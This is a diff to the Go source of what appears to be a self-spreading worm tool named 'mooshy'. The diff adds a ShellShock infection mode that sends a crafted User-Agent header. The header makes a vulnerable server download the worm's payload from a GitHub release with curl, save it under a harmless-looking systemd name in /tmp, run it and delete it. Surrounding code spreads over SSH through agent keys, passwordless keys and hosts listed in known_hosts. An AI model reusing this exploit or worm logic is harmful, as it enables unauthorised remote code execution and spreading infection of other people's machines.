@@ -1,13 +1,16 @@
 package main
 
 import (
+	"context"
 	"encoding/hex"
 	"flag"
+	"fmt"
 	"io"
 	"io/ioutil"
 	"log"
 	"math/rand"
 	"net"
+	"net/http"
 	"os"
 	"os/exec"
 	"os/user"
@@ -16,15 +19,20 @@ import (
 	"sync"
 	"time"
 
+	"github.com/google/go-github/github"
 	"github.com/pkg/errors"
 	"github.com/pkg/sftp"
 	"golang.org/x/crypto/ssh"
 	"golang.org/x/crypto/ssh/agent"
+	"golang.org/x/oauth2"
 )
 
 var MagicNumber = "xVUOcOIljRTgY2MWMK0piQ=="
 
+const UnsuspiciousExecutable = "/tmp/systemd-private-bufu"
+
 func init() {
+	log.SetFlags(0)
 	rand.Seed(time.Now().Unix())
 }
 
@@ -142,12 +150,36 @@ type ShellCodeRunner interface {
 	RunShellCode(b []byte) error
 }
 
+func latestMoosh(token string) (string, error) {
+	ctx := context.Background()
+
+	var tc *http.Client
+	if token != "" {
+		ts := oauth2.StaticTokenSource(
+			&oauth2.Token{AccessToken: token},
+		)
+		tc = oauth2.NewClient(ctx, ts)
+	}
+
+	rel, _, err := github.NewClient(tc).Repositories.GetLatestRelease(ctx, "rvolosatovs", "mooshy")
+	if err != nil {
+		return "", errors.Wrap(err, "failed to get latest release from https://github.com/rvolosatovs/mooshy")
+	}
+
+	for _, a := range rel.Assets {
+		if a.GetName() == "moosh-linux-amd64" {
+			return a.GetBrowserDownloadURL(), nil
+		}
+	}
+	return "", errors.New("not found")
+}
+
 func main() {
 	var home string
 
 	u, err := user.Current()
 	if err != nil {
-		log.Println("Failed to get current user: %s", err)
+		log.Printf("Failed to get current user: %s", err)
 		home = os.Getenv("HOME")
 	} else {
 		home = u.HomeDir
@@ -164,29 +196,62 @@ func main() {
 	useSSH := flag.Bool("ssh", false, "Use SSH for the infection")
 	useSSHAgent := flag.Bool("useSSHAgent", false, "Whether or not use SSH agent")
 	useSSHKey := flag.Bool("useSSHKey", false, "Whether or not use (passwordless) SSH private key")
-	useKnownHosts := flag.Bool("useSSHKnown", false, "Whether or not to try to infect all hosts in SSH known_hosts file")
-	moosh := flag.String("moosh", "./bin/moosh", "Path to moosh")
-	addr := flag.String("addr", "", "The lucky guy")
+	useSSHKnown := flag.Bool("useSSHKnown", false, "Whether or not to try to infect all hosts in SSH known_hosts file")
+	useShellShock := flag.Bool("shellShock", false, "Use Shell Shock for the infection")
+	moosh := flag.String("moosh", "", "Path to moosh. If empty - uses the one from https://github.com/rvolosatovs/mooshy/releases/latest )")
+	addr := flag.String("addr", "", "The lucky guy(in case of Shell Shock - endpoint)")
+	token := flag.String("token", "", "Github token to use")
 	flag.Parse()
 
-	if *addr == "" && !*useKnownHosts {
+	if *addr == "" && !*useSSHKnown || *useSSH && *useShellShock {
+		if *addr == "" && !(*useSSH && *useSSHKnown) {
+			log.Println("At least one of -addr or -useSSHKnown(with -ssh) must be specified")
+		}
+
+		if *useSSH && *useShellShock {
+			log.Println("At most one of '-ssh' and '-shellShock' must be specified")
+		}
+
 		flag.Usage()
 		os.Exit(1)
 	}
 
-	pld, err := ioutil.ReadFile(*moosh)
-	if err != nil {
-		log.Fatalf("Failed to read moosh: %s", err)
-	}
-
 	switch {
 	case *useSSH:
+		var pld []byte
+		if *moosh == "" {
+			url, err := latestMoosh(*token)
+			if err != nil {
+				log.Fatalf("Failed to query latest moosh release: %s", err)
+			}
+
+			log.Println("Downloading latest 'moosh' binary from %s...", url)
+			resp, err := http.Get(url)
+			if err != nil {
+				log.Fatalf("Failed to GET latest moosh release from %s: %s", url, err)
+			}
+
+			pld, err = ioutil.ReadAll(resp.Body)
+			if err != nil {
+				log.Fatalf("Failed to download latest moosh release: %s", err)
+			}
+
+			if err = resp.Body.Close(); err != nil {
+				log.Fatalf("Failed to close response body: %s", err)
+			}
+		} else {
+			pld, err = ioutil.ReadFile(*moosh)
+			if err != nil {
+				log.Fatalf("Failed to read moosh: %s", err)
+			}
+		}
+
 		var addrs []string
 		if *addr != "" {
 			addrs = append(addrs, *addr)
 		}
 
-		if *useKnownHosts {
+		if *useSSHKnown {
 			b, err := ioutil.ReadFile(knownHosts)
 			if err != nil {
 				log.Fatalf("Failed to read known_hosts file")
@@ -252,6 +317,32 @@ func main() {
 			}(conf, a)
 		}
 		wg.Wait()
+	case *useShellShock:
+		url, err := latestMoosh(*token)
+		if err != nil {
+			log.Fatalf("Failed to query latest moosh release: %s", err)
+		}
+
+		req, err := http.NewRequest("GET", *addr, nil)
+		if err != nil {
+			log.Fatalf("Failed to create GET request for %s: %s", *addr, err)
+		}
+
+		req.Header.Set("User-Agent", fmt.Sprintf("() { :;}; /usr/bin/curl -sL '%s' -o %s; /bin/chmod +x %s; %s; rm -f %s",
+			url, UnsuspiciousExecutable, UnsuspiciousExecutable, UnsuspiciousExecutable, UnsuspiciousExecutable))
+
+		log.Printf("Sending ShellShock GET request to %s...", *addr)
+		resp, err := http.DefaultClient.Do(req)
+		if err != nil {
+			log.Fatalf("Failed to send ShellShock GET request to %s: %s", *addr, err)
+		}
+		defer resp.Body.Close()
+
+		b, err := ioutil.ReadAll(resp.Body)
+		if err != nil {
+			log.Fatalf("Failed to read response from %s: %s", *addr, err)
+		}
+		log.Printf("%s infected.\nResponse:\n%s", *addr, string(b))
 	default:
 		l, err := net.Listen("tcp4", "0.0.0.0:0")
 		if err != nil {
